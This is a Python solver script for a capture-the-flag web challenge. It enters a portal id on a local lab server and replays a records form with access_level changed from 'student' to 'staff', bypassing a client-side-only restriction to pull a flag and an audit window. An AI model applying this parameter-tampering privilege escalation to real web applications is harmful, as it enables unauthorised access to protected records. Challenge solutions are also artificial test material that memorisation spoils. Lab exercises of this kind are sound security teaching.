#!/usr/bin/env python3
"""Member 3 solver for CNR-04: enter portal id, replay the records form with access_level=staff
(the client-side-only restriction), read the flag and the audit window.
Usage: python3 solvers/m3_solve_stage4.py [http://host:8081] [PORTAL_ID]"""
import re, sys, requests
base = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8081").rstrip("/")
pid = sys.argv[2] if len(sys.argv) > 2 else "LANTERNGATE"
G = base + "/legacy/lantern-gate"
s = requests.Session()
s.post(G, data={"portal_id": pid})
# Baseline: what the browser would send. Then tamper the single parameter the UI locks.
base_r = s.post(G + "/request", data={"student_id": "S0001", "module": "NET101", "access_level": "student"})
assert "IE3132" not in base_r.text
r = s.post(G + "/request", data={"student_id": "S0001", "module": "NET101", "access_level": "staff"})
flag = re.search(r"IE3132\{[^}]+\}", r.text); win = re.search(r"between <b>(.*?)</b>", r.text)
print("FLAG:", flag.group(0) if flag else None); print("AUDIT WINDOW:", win.group(1) if win else None)
